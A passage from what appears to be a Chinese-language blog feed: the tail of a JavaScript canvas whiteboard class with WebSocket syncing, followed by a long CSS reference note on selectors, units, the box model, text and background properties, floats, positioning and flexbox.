class="built_in">JSON</span>.stringify(&#123; <span class="attr">kind</span>: <span class="number">1</span>, <span class="attr">points</span>: <span class="keyword">this</span>.strokes &#125;));</span><br><span class="line">  &#125;</span><br><span class="line">  addPoint = <span class="function">(<span class="params">x, y, newStroke, str</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> p = &#123; x, y &#125;;</span><br><span class="line">    <span class="keyword">const</span> &#123; graphType &#125; = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">if</span> (graphType === <span class="string">'text'</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> d = &#123; <span class="attr">data</span>: [p], <span class="attr">text</span>: str, <span class="attr">strokeColor</span>: <span class="keyword">this</span>.strokeColor, <span class="attr">graphType</span>: <span class="keyword">this</span>.graphType &#125;;</span><br><span class="line">      <span class="keyword">this</span>.strokes.push(d);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (newStroke) &#123;</span><br><span class="line">      <span class="keyword">const</span> d = &#123; <span class="attr">data</span>: [p], <span class="attr">strokeColor</span>: <span class="keyword">this</span>.strokeColor, <span class="attr">width</span>: <span class="keyword">this</span>.lineWidth, <span class="attr">graphType</span>: <span class="keyword">this</span>.graphType &#125;;</span><br><span class="line">      <span class="keyword">this</span>.strokes.push(d);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'pencil'</span> || graphType === <span class="string">'rubber'</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.strokes[<span class="keyword">this</span>.strokes.length - <span class="number">1</span>].data.push(p);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (graphType === <span class="string">'line'</span> || graphType === <span class="string">'circle'</span> || graphType === <span class="string">'square'</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.strokes[<span class="keyword">this</span>.strokes.length - <span class="number">1</span>].data[<span class="number">1</span>] = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.repaint();</span><br><span class="line">  &#125;</span><br><span class="line">  repaint = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 清空再重绘</span></span><br><span class="line">    repaint(<span class="keyword">this</span>.ctx, <span class="keyword">this</span>.strokes);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 设置画笔粗细</span></span><br><span class="line">  setLineWidth = <span class="function">(<span class="params">width</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.lineWidth = width;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 设置类型 &#123;pencil, line, circle, square, rubber, text&#125;</span></span><br><span class="line">  setGraphType = <span class="function">(<span class="params">graphType</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.graphType = graphType;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 设置画笔颜色</span></span><br><span class="line">  setGraphColor = <span class="function">(<span class="params">color</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.strokeColor = color;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 清空</span></span><br><span class="line">  clear = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.strokes = [];</span><br><span class="line">    <span class="keyword">this</span>.ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line">    <span class="keyword">this</span>.sendStrokes();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 撤销</span></span><br><span class="line">  cancelOneStep = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.strokes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.redo.push(<span class="keyword">this</span>.strokes[<span class="keyword">this</span>.strokes.length - <span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">this</span>.strokes.pop();</span><br><span class="line">      <span class="keyword">this</span>.repaint();</span><br><span class="line">      <span class="keyword">this</span>.sendStrokes();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 恢复：再执行最近依次操作</span></span><br><span class="line">  redoStep = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.redo.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.strokes.push(<span class="keyword">this</span>.redo[<span class="keyword">this</span>.redo.length - <span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">this</span>.redo.pop();</span><br><span class="line">      <span class="keyword">this</span>.repaint();</span><br><span class="line">      <span class="keyword">this</span>.sendStrokes();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientBoard</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(options) &#123;</span><br><span class="line">    <span class="keyword">this</span>.canvas = <span class="built_in">document</span>.getElementById(<span class="string">'canvas'</span>);</span><br><span class="line">    <span class="keyword">this</span>.ctx = <span class="keyword">this</span>.canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">    <span class="keyword">const</span> &#123; wid, token &#125; = options;</span><br><span class="line">    <span class="keyword">const</span> ws = <span class="string">`ws://live.ngrok.elitemc.cn:8000/ws/whiteboard-<span class="subst">$&#123;wid&#125;</span>?token=<span class="subst">$&#123;token&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">this</span>.socket = <span class="keyword">new</span> WebSocket(ws);</span><br><span class="line">    <span class="keyword">this</span>.socket.onmessage = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> messages = event.data.split(<span class="string">'\n'</span>);</span><br><span class="line">      messages.map(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.onMessage(<span class="built_in">JSON</span>.parse(data));</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.socket.onopen = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// console.log(event);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  onMessage = <span class="function">(<span class="params">message</span>) =&gt;</span> &#123;</span><br><span class="line">    repaint(<span class="keyword">this</span>.ctx, message.points);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSS文档</title>
      <link href="/2018/10/06/CSS%E6%96%87%E6%A1%A3/"/>
      <url>/2018/10/06/CSS%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<h3 id="1-基础"><a href="#1-基础" class="headerlink" title="1. 基础"></a>1. 基础</h3><p><img src="/2018/10/06/CSS文档/1.svg" style="padding-top:20px; max-width:500px"></p><h4 id="1-1-浏览器样式前缀"><a href="#1-1-浏览器样式前缀" class="headerlink" title="1.1 浏览器样式前缀"></a>1.1 浏览器样式前缀</h4><table><thead><tr><th>浏览器分类</th><th style="text-align:center">浏览器</th><th style="text-align:right">私有属性的前缀</th></tr></thead><tbody><tr><td>Gecko引擎内核的浏览器</td><td style="text-align:center">Mozilla(Firefox)</td><td style="text-align:right">-moz-</td></tr><tr><td>Presto引擎内核的浏览器</td><td style="text-align:center">Opera</td><td style="text-align:right">-o-</td></tr><tr><td>KHTML引擎内核的浏览器</td><td style="text-align:center">Konqueror</td><td style="text-align:right">-khtml-</td></tr><tr><td>Trident引擎内核的浏览器</td><td style="text-align:center">Internet Explorer</td><td style="text-align:right">-ms- </td></tr><tr><td>Webkit</td><td style="text-align:center">Chrome, Safari</td><td style="text-align:right">-webkit-</td></tr></tbody></table><p><br></p><h4 id="1-2-选择器"><a href="#1-2-选择器" class="headerlink" title="1.2 选择器"></a>1.2 选择器</h4><p>样式系统从关键选择器开始匹配，然后左移查找规则选择器的祖先元素。只要选择器的子树一直在工作，样式系统就会持续左移，直到和规则匹配，或者是因为不匹配而放弃该规则。</p><p>试想一下，如果采用从左至右的方式读取CSS规则，那么大多数规则读到最后（最右）才会发现是不匹配的，这样做会费时耗能，最后有很多都是无用的；</p><p>而如果采取<em>从右向左的方式，那么只要发现最右边选择器不匹配，就可以直接舍弃了，避免了许多无效匹配。</em></p><ul><li><p>属性选择器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-quantity=&quot;1kg&quot; data-vegetable=&quot;not spicy like chili&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">[attr]       具有attr属性的元素</span><br><span class="line">[attr=val]   attr属性值为val的元素</span><br><span class="line">[attr~=]     attr属性值包含val的元素</span><br><span class="line"></span><br><span class="line">[attr|=val]  attr属性值是 val 或值以 val- 开头的元素</span><br><span class="line">[attr^=val]  attr属性值以 val 开头的元素</span><br><span class="line">[attr$=val]  attr属性值以 val 结尾的元素</span><br><span class="line">[attr*=val]  attr属性值包含 val 的元素</span><br></pre></td></tr></table></figure></li><li><p>伪类选择器<br>一个CSS伪类 是一个以冒号(:)作为前缀，被添加到一个选择器末尾的关键字。当你希望样式在特定状态下才呈现特定样式，你可以在该元素选择器后加上对应的伪类。</p></li></ul><table><thead><tr><th>伪类选择器</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>:active</td><td style="text-align:center">被激活的元素，通常匹配tab交互。这个样式可能会被其它伪类覆盖。<br>链接伪类css顺序<code>:link - :visited - :hover - :active</code></td></tr><tr><td>:visited</td><td style="text-align:center">被访问过的链接</td></tr><tr><td>:hover</td><td style="text-align:center">光标悬停</td></tr><tr><td>:focus</td><td style="text-align:center">获得焦点的元素。用户点击、触摸元素，或通过键盘tab键选择它时会触发。</td></tr><tr><td>:link</td><td style="text-align:center"><code>a:link</code>选中元素当中的链接</td></tr><tr><td>:checked</td><td style="text-align:center">处于选中状态的radio, checkbox, 或select中的option元素</td></tr><tr><td>:disabled</td><td style="text-align:center">任何被禁用的元素</td></tr><tr><td>:enabled</td><td style="text-align:center">任何启用的元素</td></tr><tr><td>:invalid</td><td style="text-align:center"><code>&lt;input&gt;</code>或其它<code>&lt;form&gt;元素</code>内容未通过验证 <code>&lt;input type=&quot;email&quot; /&gt;</code></td></tr><tr><td>:valid</td><td style="text-align:center"><code>&lt;input&gt;</code>或其它<code>&lt;form&gt;元素</code>内容通过验证 </td></tr><tr><td>:in-range</td><td style="text-align:center"><code>&lt;input&gt;</code>当前值处于min和max范围内</td></tr><tr><td>:out-of-range</td><td style="text-align:center"><code>&lt;input&gt;</code>当前值处于min和max范围外</td></tr><tr><td>:read-only</td><td style="text-align:center">元素不可被用户编辑的状态</td></tr><tr><td>:read-wirte</td><td style="text-align:center">可被用户编辑</td></tr><tr><td>:required</td><td style="text-align:center">拥有required属性的<code>&lt;input&gt;&lt;select&gt;&lt;textarea&gt;</code>元素</td></tr><tr><td>:optional</td><td style="text-align:center">没有required属性的<code>&lt;input&gt;&lt;select&gt;&lt;textarea&gt;</code>元素</td></tr><tr><td>:empty</td><td style="text-align:center">没有子元素的元素(子元素可以是元素节点、文本、空格)</td></tr><tr><td>:first-child</td><td style="text-align:center">一组兄弟元素中的第一个元素 (:first-of-type)</td></tr><tr><td>:last-child</td><td style="text-align:center">一组兄弟元素中的最后一个元素</td></tr><tr><td>:not(selector)</td><td style="text-align:center"><code>p :not(div) :not(.fancy)</code> 非<code>&lt;div&gt;</code>或类名不是<code>.fancy</code>的<code>&lt;p&gt;</code></td></tr><tr><td>:nth-child(an+b)</td><td style="text-align:center">选择结果为第(an+b)个元素的集合(n=0,1,2…)<br> <code>tr:nth-child(2n+1/2n) 奇数/偶数行；span:nth-child(-n+3) 前三个元素</code></td></tr><tr><td>:root</td><td style="text-align:center">匹配文档树的根元素，表示<code>&lt;html&gt;</code>元素</td></tr><tr><td>:target</td><td style="text-align:center">ID与当前URL片段匹配，如 <code>http://www.example.com#section2</code>; <br><code>&lt;section id=&quot;section2&quot;&gt;&lt;/section&gt;; :target{color:red}</code></td></tr><tr><td>:lang()</td><td style="text-align:center">基于元素语言来匹配页面元素</td></tr><tr><td>@page:first</td><td style="text-align:center">打印文档时，第一页的样式 <code>@page:first{ margin-left: 50% }</code></td></tr></tbody></table><p><strong> :first-child不生效：使用:first-child伪类时一定要保证前面没有兄弟节点。</strong></p><ul><li>伪元素 </li></ul><table><thead><tr><th>伪元素</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>::after</td><td style="text-align:center">创建一个伪元素，其将成为元素的最后一个子元素，通常会配合content属性来为该元素添加装饰内容。</td></tr><tr><td>::before</td><td style="text-align:center">创建一个伪元素，其将成为元素的第一个子元素，通常会配合content属性来为该元素添加装饰内容。</td></tr><tr><td>::first-letter</td><td style="text-align:center">选中该块级元素第一行的第一个字母，并且文字所处的行之前没有其他内容(如图片或表格)</td></tr><tr><td>::first-line</td><td style="text-align:center">选中该块级元素的第一行应用样式</td></tr><tr><td>::selection</td><td style="text-align:center">应用于文档中被用户高亮的部分（使用鼠标或其他设备选中的部分）</td></tr></tbody></table><ul><li>组合器</li></ul><table><thead><tr><th>组合器</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>A,B</td><td style="text-align:center">匹配满足A或B的任意元素</td></tr><tr><td>A B</td><td style="text-align:center">匹配B元素，B是A的后代节点</td></tr><tr><td>A &gt; B</td><td style="text-align:center">匹配B元素，B是A的直接子节点</td></tr><tr><td>A + B</td><td style="text-align:center">匹配B元素，AB有相同的父节点，并且B紧跟在A的后面</td></tr><tr><td>A ~ B</td><td style="text-align:center">匹配B元素，AB有相同的父节点，B在A之后，但不一定紧挨着A</td></tr></tbody></table><p><br></p><h4 id="1-3-值和单位"><a href="#1-3-值和单位" class="headerlink" title="1.3 值和单位"></a>1.3 值和单位</h4><table><thead><tr><th>单位</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>px</td><td style="text-align:center">绝对单位</td></tr><tr><td>em</td><td style="text-align:center">1em与当前元素的字体大小相同。em单位会继承父元素的字体大小<strong>(最常用的相对单位)</strong></td></tr><tr><td>rem</td><td style="text-align:center">与em相似，但它总是等于默认基础字体大小的尺寸，继承将不起作用</td></tr><tr><td>vw,vh</td><td style="text-align:center">视口宽度的1/100和视口高度的1/100(不被广泛支持)</td></tr><tr><td>ex,ch</td><td style="text-align:center">小写x的高度和数字0的宽度(不被广泛支持)</td></tr></tbody></table><p><em>无单位的值</em>: 0, line-height: 1.8, 动画的数值, 百分比, 颜色</p><p><br></p><h4 id="1-4-层叠和继承"><a href="#1-4-层叠和继承" class="headerlink" title="1.4 层叠和继承"></a>1.4 层叠和继承</h4><ul><li>!important &gt; 行内样式-1000 &gt; id选择器-100 &gt; 类选择器/属性选择器/伪类-10 &gt; 元素选择器/伪元素-1</li><li>后面的规则 &gt; 前面的规则</li><li>继承: inherit - 与父元素一样; initial - 与浏览器默认样式一样; unset - 重置为自然值; </li></ul><p><br></p><h4 id="1-5-盒模型"><a href="#1-5-盒模型" class="headerlink" title="1.5 盒模型"></a>1.5 盒模型</h4><p>每个元素被表示为一个矩形的方框，框的内容、内边距、边界、外边距一层层构建起来。浏览器渲染网页布局时，会算出每个框每一层要用什么样式，以及框放在哪里。<br>盒子属性: width, height, padding, margin, border, min-width, max-width, min-height, max-height</p><p><em><code>box-sizing</code></em></p><ul><li><p>content-box<br>W3C标准盒模型: element width = border + padding + content width<br><img src="/2018/10/06/CSS文档/1.png"></p></li><li><p>border-box<br>IE盒模型: element width = content width(内容宽度包含了content width，border, padding, 建议使用)<br><img src="/2018/10/06/CSS文档/2.png"></p></li></ul><p><em><code>overflow</code></em><br>当你设置了一个框的大小，允许的大小可能不适合放置内容，这种情况下内容会从盒子溢流。使用overflow，或overflow-x,overflow-y来控制这种情况。<br>auto: &nbsp;&nbsp;&nbsp; 溢流的内容被隐藏，出现滚动条来查看<br>hidden: 溢流的内容被隐藏<br>visible: 溢流的内容被显示在盒子的外边（这是默认行为）<br>scroll: 不管内容有没有溢出容器，都会显示滚动条<br>no-display: 内容溢出容器时，不显示元素，相当于添加了display:none<br>no-content: 内容溢出容器时，不显示内容，相当于添加了visibility:hidden</p><p><em><code>display</code></em><br>block:  内容独占一行，可以设置宽高<br>inline: 与周围的行内元素出现在同一行，设置宽高无效，设置padding,margin,border会更新周围文字的位置<br>inline-block: 不会独占一行，能设置宽高</p><p><br></p><h3 id="2-文字"><a href="#2-文字" class="headerlink" title="2. 文字"></a>2. 文字</h3><p><em><code>文字</code></em><br>color, font-family, font-size, line-height, letter-spacing(字母间距), word-spacing(单词间距)<br>font-style  : normal, italic斜体, oblique<br>font-weight : normal, bold, lighter, bolder<br>text-transform : none, uppercase, lowercase, capitalize, full-width<br>text-decoration: none, underline, overline, line-through<br>text-shadow: 4px 4px 5px red (水平偏移, 垂直偏移, 模糊半径, 颜色，逗号分隔多个阴影值可用于同一文本)<br>text-align: left, right, center, justify(使文本展开)<br>@font-face: 使用字体文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">  font-family: &apos;ciclefina&apos;;</span><br><span class="line">  src: url(&apos;fonts/cicle_fina-webfont.eot&apos;);</span><br><span class="line">  src: url(&apos;fonts/cicle_fina-webfont.eot?#iefix&apos;) format(&apos;embedded-opentype&apos;),</span><br><span class="line">         url(&apos;fonts/cicle_fina-webfont.woff2&apos;) format(&apos;woff2&apos;),</span><br><span class="line">         url(&apos;fonts/cicle_fina-webfont.woff&apos;) format(&apos;woff&apos;),</span><br><span class="line">         url(&apos;fonts/cicle_fina-webfont.ttf&apos;) format(&apos;truetype&apos;),</span><br><span class="line">         url(&apos;fonts/cicle_fina-webfont.svg#ciclefina&apos;) format(&apos;svg&apos;);</span><br><span class="line">  font-weight: normal;</span><br><span class="line">  font-style: normal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em><code>文本布局</code></em><br>text-indent<br><strong>text-overflow</strong>: 溢出内容显示符号。clip 被剪切 / ellipsis 省略号<br><strong>white-space</strong>: 处理元素中的空白。 normal 连续的空白符会被合并,必要时会换行 / pre / nowrap / pre-wrap 连续的空白符会被保留，必要时会换行 / pre-line<br><strong>word-break</strong>: 指定单词内断行。normal 默认的断行规则，中文到边界上的汉字换行， / break-all 可在任意字符间断行 / keep-all<br><strong>word-wrap</strong>: 当一个不能被分开的字符串太长而不能填充其包裹盒时，为防止溢出，是否这样的单词中断换行。 normal 单词结束处换行 / break-word 强制切割换行<br><strong>text-align-last</strong>: 最后一行文本的对齐规则。 auto / start / end / left / right / center / justify</p><p><em><code>列表 - ul</code></em><br><strong>list-style-type</strong> : 列表符号的类型。disc 实心原点 / circle 空心原点 / square 实心方块 / decimal 数字1,2 / decimal-leading-zero 数字01,02 / lower-roman  i, ii / upper-roman I, II / lower-greek α, β, γ / lower-alpha a,b,c / upper-alpha A,B,C<br><strong>list-stype-position</strong> : 列表符号在盒内还是盒外。inside / outside<br><strong>list-style-image</strong>: url(‘1.png’)</p><p><br></p><h3 id="3-区块"><a href="#3-区块" class="headerlink" title="3. 区块"></a>3. 区块</h3><p><em><code>背景</code></em><br>默认情况下，背景会延伸到边框所在的区域下层。<br>background-color<br><strong>background-image</strong>: url(‘1.png’) / 渐变 linear-gradient(渐变的方向, 开始的颜色, 结尾的颜色) to bottom, to right, to bottom right<br><strong>background-repeat</strong>: 指定背景图像如何重复。 no-repeat / repeat-x / repeat-y / repeat<br><strong>background-position</strong>: 指定图像(x,y)坐标. 200px 25px / 10% 20% / 使用关键字 [left,center,right], [top,center,bottom]<br><strong>background-attachment</strong>: 设置元素背景图片是否固定或者随着页面的其余部分滚动，一般运用在html或body上 scroll / fixed<br><strong>background-size</strong>: 调整背景图像大小。auto 图片原始宽高 / <code>&lt;length&gt;&lt;percentage&gt;</code> 具体宽高 / cover 完全覆盖背景区，图像比例不变，图片部分看不见 / contain 单边覆盖背景区，图像比例不变，背景区部分空白</p><p><em><code>边框</code></em><br>border, border-width, border-color, border-radius, border-image<br>border-style: none/ hidden / solid / dashed / dotted / double / groove / ridge / inset / outset / inherit</p><p><em><code>表格</code></em><br>table-layout: fixed, 创建可预测的表布局，在标题设置width设置列的宽度<br>border-collapse: collapse, 使表元素边框合并</p><p><em><code>高级区块效果</code></em><br>box-shadow: 5px 5px 5px rgba(0,0,0,.7) 水平偏移量,垂直偏移量,模糊半径,颜色<br>box-shadow: inset 5px 5px 5px rgba(0,0,0,.7) <strong>inset</strong> 定义内部阴影<br>background-blend-mode: 将单个元素的多重背景图片和背景颜色设置混合在一起<br>mix-blend-mode: 将一个元素与它覆盖的那些元素各自设置的背景和内容混合在一起。normal | multiply | screen | overlay | darken | lighten | color-dodge | color-burn | hard-light | soft-light | difference | exclusion | hue | saturation | color | luminosity</p><p><br></p><h3 id="4-排版"><a href="#4-排版" class="headerlink" title="4. 排版"></a>4. 排版</h3><p>正常布局流: position:static，是指在不对页面进行任何布局控制时，浏览器默认的HTML布局方式。<br><br></p><h4 id="4-1-浮动"><a href="#4-1-浮动" class="headerlink" title="4.1 浮动"></a>4.1 浮动</h4><p>float:left/right/none/inherit。浮动元素会脱离正常的文档布局流，并吸附到其父容器的左边(float:left)。在正常布局中位于该浮动元素之下的内容，此时会围绕着浮动元素，填满其右侧的空间。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 首字母下沉</span><br><span class="line">p::first-letter&#123;</span><br><span class="line">  font-size: 3rem;</span><br><span class="line">  float: left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em>清除浮动</em>: 所有在浮动下面的自身不浮动的内容都将围绕浮动元素进行包装。如果没有处理这些元素，就会变得很糟糕。<code>{ clear: both }</code>当把这个应用到一个元素时，意味着“此处停止浮动”。<br><br></p><h4 id="4-2-定位"><a href="#4-2-定位" class="headerlink" title="4.2 定位"></a>4.2 定位</h4><p>绝对定位(Static positioning)：元素在文档布局流的默认位置<br>相对定位(Relative positioning): 在正常文档流中的位置进行相对移动<br>绝对定位(Absolute positioning): 将元素完全从页面的正常布局流中移出。元素相对最近被定位的祖先元素固定。<br>固定定位(Fixed positioning): 将元素完全从页面的正常布局流中移出。将一个元素相对浏览器视口固定。<br><br></p><h4 id="4-3-flex布局"><a href="#4-3-flex布局" class="headerlink" title="4.3 flex布局"></a>4.3 flex布局</h4><p>支持浏览器 Chrome 21+, Opera 12.1+, Firefox 22+, Safari 6.1+, IE 10+。</p><p>采用flex布局的元素，称为flex容器。它的所有子元素自动成为容器成员，子元素的float, clear和vertical-align属性将失效。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  display: inline-flex;   // 行内元素也可以使用flex</span><br><span class="line">  display: -webkit-flex;  // 兼容Safari</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>容器存在两根轴：水平的主轴(main axis)和垂直的交叉轴(cross axis)。主轴的开始位置叫<code>main start</code>， 结束位置叫<code>main end</code>， 交叉轴开始位置叫<code>cross start</code>， 结束位置叫<code>cross end</code>。<br><img src="/2018/10/06/CSS文档/4.png" style="max-width:500px"></p><p><br></p><h5 id="4-3-1-容器的属性"><a href="#4-3-1-容器的属性" class="headerlink" title="4.3.1 容器的属性"></a>4.3.1 容器的属性</h5><ul><li>flex-direction: 决定主轴的方向<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  flex-direction: row | row-reverse | column | column-reverse </span><br><span class="line">&#125;</span><br><span class="line">// row(默认值)     主轴为水平方向，起点在左端</span><br><span class="line">// row-reverse    主轴为水平方向，起点在右端</span><br><span class="line">// column         主轴为垂直方向，起点在上方</span><br><span class="line">// column-reverse 主轴为垂直防线，起点在下方</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSS文档/5.png" style="max-width:500px"></p><p><br></p><ul><li>flex-wrap: 如果一条轴线排不下，如何换行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  flex-wrap: nowrap | wrap | wrap-reverse;</span><br><span class="line">&#125;</span><br><span class="line">// nowrap       不换行</span><br><span class="line">// wrap         换行，第一行在上方</span><br><span class="line">// wrap-reverse 换行，第一行在下方</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSS文档/6.png" style="max-width:500px"><br><img src="/2018/10/06/CSS文档/7.png" style="max-width:500px"><br><img src="/2018/10/06/CSS文档/8.jpg" style="max-width:500px"><br><br></p><ul><li><p>flex-flow: 是flex-direction属性和flex-wrap属性的简写模式，默认值为row nowrap。</p></li><li><p>justify-content: 项目在主轴上的对齐方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  justify-content: flex-start | flex-end | center | space-between | space-around;</span><br><span class="line">&#125;</span><br><span class="line">// flex-start(默认值)  左对齐</span><br><span class="line">// flex-end           右对齐</span><br><span class="line">// center             居中</span><br><span class="line">// space-between      两端对齐，项目之间的间隔都相等</span><br><span class="line">// space-around       每个项目两侧都相等</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSS文档/9.png" style="max-width:500px"></p><p><br></p><ul><li>align-items: 项目在交叉轴上如何对齐<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  align-items: flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br><span class="line">// flex-start     交叉轴的起点对齐</span><br><span class="line">// flex-end       交叉轴的终点对齐</span><br><span class="line">// center         交叉轴的中点对齐</span><br><span class="line">// baseline       项目第一行文字的基线对齐</span><br><span class="line">// stretch(默认值) 如果项目未设置高度或为auto，将占满整个容器的高度</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSS文档/10.png" style="max-width:500px"></p><ul><li>align-content: 定义了多根轴线的对齐方式。</li></ul><p><br></p><h5 id="4-3-2-项目的属性"><a href="#4-3-2-项目的属性" class="headerlink" title="4.3.2 项目的属性"></a>4.3.2 项目的属性</h5><ul><li>order: 定义项目的排列顺序。数值越小，排列越靠前，默认为0.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.item&#123;</span><br><span class="line">  order: &lt;integer&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSS文档/11.png" style="max-width:500px"><br><br></p><ul><li>flex-grow: 定义项目的放大比例，默认为0。如果项目的<code>flex-grow</code>属性都为1，则它们将等分剩余空间。如果一个项目的<code>flex-grow</code>属性为2，其余为1，则前者占据的剩余空间将比其他项多一倍。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.item&#123;</span><br><span class="line">  flex-grow: &lt;number&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSS文档/12.png" style="max-width:500px"></p><ul><li>flex-shrink: 定义了项目的缩小比例，默认为1。如果空间不足，项目将缩小。如果项目的<code>flex-shrink</code>属性都为1，当空间不足时，都将等比例缩小。如果一个项目的<code>flex-shrink</code>属性为0，其他项目为都为1，空间不足时，前者不缩小。<br><img src="/2018/10/06/CSS文档/13.jpg" style="padding-top:20px;max-width:500px"><br><br></li><li><p>flex-basis: 定义了在分配多余空间之前，项目占据的主轴空间。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。</p></li><li><p>flex: 是<code>flex-grow, flex-shrink 和 flex-basis</code>的简写，默认值为<code>0 1 auto</code>。 </p></li><li><p>align-self: 允许单个项目有与其他项目不一样的对齐方式，可覆盖<code>align-items</code>属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 